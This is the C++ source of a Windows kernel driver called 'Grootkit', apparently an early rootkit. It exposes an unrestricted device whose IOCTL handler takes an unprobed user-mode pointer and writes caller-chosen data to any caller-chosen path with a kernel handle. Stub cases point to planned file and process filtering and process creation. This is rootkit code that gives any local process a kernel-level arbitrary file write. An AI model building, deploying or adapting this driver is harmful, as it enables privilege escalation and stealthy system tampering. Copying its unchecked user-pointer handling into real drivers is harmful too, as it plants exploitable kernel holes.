#include <ntddk.h>
#include "GrootkitCommon.h"

// prototypes
void GrootkitUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS GrootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS GrootkitDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS PerformCommand(GrootkitData* command);

//Driver Entry
extern "C" NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {

	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = GrootkitUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = GrootkitCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = GrootkitCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = GrootkitDeviceControl;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\Grootkit");

	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&devName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&DeviceObject
	);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device object (0x%08X)\n", status));
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Grootkit");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	return STATUS_SUCCESS;
}

void GrootkitUnload(PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Grootkit");
	// delete symbolic link
	IoDeleteSymbolicLink(&symLink);

	// delete device object
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS GrootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS GrootkitDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);

	// get our IO_STACK_LOCATION
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;
	ULONG len;
	GrootkitData* data;

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
		case IOCTL_GROOTKIT:
			len = stack->Parameters.DeviceIoControl.InputBufferLength;
			if (len < sizeof(GrootkitData)) {
				status = STATUS_BUFFER_TOO_SMALL;
				break;
			}
			data = (GrootkitData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
			if (data == nullptr){
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			status = PerformCommand(data);
			break;

		default:
			status = STATUS_INVALID_DEVICE_REQUEST;
			break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS PerformCommand(GrootkitData* command) {
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE fileHandle = NULL;
	OBJECT_ATTRIBUTES objectAttributes;
	IO_STATUS_BLOCK ioStatusBlock;

	switch (command->whichCommand)
	{
		case FileCreation:
			InitializeObjectAttributes(&objectAttributes,
				command->command.FileCreation.filePath,
				OBJ_KERNEL_HANDLE,
				NULL,
				NULL);
			status = ZwCreateFile(&fileHandle, 
				GENERIC_WRITE, 
				&objectAttributes, 
				&ioStatusBlock, 
				NULL, 
				FILE_ATTRIBUTE_NORMAL, 
				NULL,
				FILE_OVERWRITE_IF,
				FILE_NON_DIRECTORY_FILE,
				NULL,
				NULL);
			if ( !NT_SUCCESS(status) ) {
				break;
			}
			status = ZwWriteFile(fileHandle,
				NULL, 
				NULL, 
				NULL, 
				&ioStatusBlock, 
				command->command.FileCreation.data->Buffer, 
				command->command.FileCreation.data->Length,
				NULL, 
				NULL);
			break;
		case FileFilter:
		case ProcessFilter:
		case ProcessCreation:
			status = STATUS_INVALID_MEMBER;

		default:
			break;
	}

	return status;
}